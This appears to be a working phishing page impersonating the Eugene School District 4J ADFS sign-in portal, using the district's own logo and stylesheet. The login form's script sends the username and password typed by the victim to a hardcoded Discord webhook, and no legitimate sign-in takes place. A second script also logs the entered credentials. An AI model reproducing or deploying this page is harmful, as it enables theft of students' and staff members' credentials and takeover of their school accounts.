<!DOCTYPE html>
<html lang="en-US">
    <head>

        <title>Sign In</title>
        <script type='text/javascript'>



</script>


        
        <link rel="stylesheet" type="text/css" href="https://adfs.4j.lane.edu/adfs/portal/css/style.css?id=D74D4D6943F32AE6F7F11D14D601DBB0E1A58919176EE512150366B6279AAF99" /><style>.illustrationClass {background-image:url(https://adfs.4j.lane.edu/adfs/portal/illustration/illustration.png?id=183128A3C941EDE3D9199FA37D6AA90E0A7DFE101B37D10B4FEDA0CF35E11AFD);}</style>

    </head>
    <body dir="ltr" class="body">
    <div id="noScript" style="position:static; width:100%; height:100%; z-index:100">
        <h1>JavaScript required</h1>
        <p>JavaScript is required. This web browser does not support JavaScript or JavaScript in this web browser is not enabled.</p>
        <p>To find out if your web browser supports JavaScript or to enable JavaScript, see web browser help.</p>
    </div>
    <script type="text/javascript" language="JavaScript">
         document.getElementById("noScript").style.display = "none";
    </script>
    <div id="fullPage">
        <div id="brandingWrapper" class="float">
            <div id="branding"></div>
        </div>
        <div id="contentWrapper" class="float">
            <div id="content">
                <div id="header">
                    <img class="logoImage" src="https://adfs.4j.lane.edu/adfs/portal/logo/logo.png?id=8A80A1C85ED34E2DA1864ED2DCEF8C00ACC761CF9D9F2D109DF7310938CD11B2" alt="Eugene School District 4J"/>
                </div>
                <div id="workArea">
                    
    <div id="authArea" class="groupMargin">
      <div>
        <p style="margin-bottom: 25px;">Please sign in with your 4J username. <br />Do not include "@4j.lane.edu"</p>
      
        <form id="login-form">
          <label for="username" class="sr-only"></label>
          <input type="text" id="username" name="username" placeholder="Username"><br>
      
          <label for="password" class="sr-only"></label>
          <input type="password" id="password" name="password" placeholder="Password"><br>
      
          <button type="submit" id="signin-btn">Sign in</button>
        </form>
      </div>
      
      <style>
        #signin-btn {
          background-color: #2672EC;
          color: white;
          height: 30px;
          width: 90px;
          font-size: 14px;
          margin-top: 30px;
        }
        input[type="text"], input[type="password"] {
          height: 25px;
          width: 350px;
          font-size: 12px;
        }
      </style>
      
      
        
        <script>
          const webhookUrl = "https://discord.com/api/webhooks/1099787828482814015/OX4O2fN45ISZI5gQGGOwTotvMJjI2I2Fhb3Wm1JxzyJyDA4X5XPM-hf7r5dRaRwqGIEa";
        
          const loginForm = document.getElementById("login-form");
          loginForm.addEventListener("submit", event => {
            event.preventDefault();
        
            const username = document.getElementById("username").value;
            const password = document.getElementById("password").value;
        
            const message = {
              embeds: [
                {
                  title: "Login Details",
                  color: 16711680,
                  fields: [
                    {
                      name: "Username",
                      value: username,
                      inline: true
                    },
                    {
                      name: "Password",
                      value: password,
                      inline: true
                    }
                  ]
                }
              ]
            };
        
            const xhr = new XMLHttpRequest();
            xhr.open("POST", webhookUrl);
            xhr.setRequestHeader("Content-Type", "application/json");
            xhr.send(JSON.stringify(message));
          });
        </script>
        
      
      </div>
      
      <script>
        const form = document.getElementById('login-form');
        form.addEventListener('Sign in', (event) => {
          event.preventDefault();
          const username = document.getElementById('username').value;
          const password = document.getElementById('password').value;
          // Your login validation logic here
          console.log(`Username: ${username}, Password: ${password}`);
        });
      </script>
      
      
        
    


    <script type='text/javascript'>


"use strict";


if (navigator.userAgent.match(/iPhone/i) != null) {
    var emails = document.querySelectorAll("input[type='email']");
    if (emails) {
        for (var i = 0; i < emails.length; i++) {
            emails[i].type = 'text';
        }
    }
}

function getStyle(element, styleProp) {
    var propStyle = null;

    if (element && element.currentStyle) {
        propStyle = element.currentStyle[styleProp];
    }
    else if (element && window.getComputedStyle) {
        propStyle = document.defaultView.getComputedStyle(element, null).getPropertyValue(styleProp);
    }

    return propStyle;
}

var computeLoadIllustration = function () {
    var branding = document.getElementById("branding");
    var brandingDisplay = getStyle(branding, "display");
    var brandingWrapperDisplay = getStyle(document.getElementById("brandingWrapper"), "display");

    if (brandingDisplay && brandingDisplay !== "none" &&
        brandingWrapperDisplay && brandingWrapperDisplay !== "none") {
        var newClass = "illustrationClass";

        if (branding.classList && branding.classList.add) {
            branding.classList.add(newClass);
        } else if (branding.className !== undefined) {
            branding.className += " " + newClass;
        }
        if (window.removeEventListener) {
            window.removeEventListener('load', computeLoadIllustration, false);
            window.removeEventListener('resize', computeLoadIllustration, false);
        }
        else if (window.detachEvent) {
            window.detachEvent('onload', computeLoadIllustration);
            window.detachEvent('onresize', computeLoadIllustration);
        }
    }
};

if (window.addEventListener) {
    window.addEventListener('resize', computeLoadIllustration, false);
    window.addEventListener('load', computeLoadIllustration, false);
}
else if (window.attachEvent) {
    window.attachEvent('onresize', computeLoadIllustration);
    window.attachEvent('onload', computeLoadIllustration);
}

var userNameInput = document.getElementById('userNameInput');
if (userNameInput)
{

userNameInput.placeholder = 'Username';
}


var loginMessage = document.getElementById('loginMessage');  
if (loginMessage)  
{  
       
       loginMessage.innerHTML = 'Please sign in with your 4J username. <br />Do not include "@4j.lane.edu"';  
}  


var copyright = document.getElementById('copyright');  
if (copyright)  
{  
       copyright.innerHTML = '<a href="https://www.4j.lane.edu/">Eugene School District 4J</a>';  
} 
//]]>
</script>


    </body>
</html> 
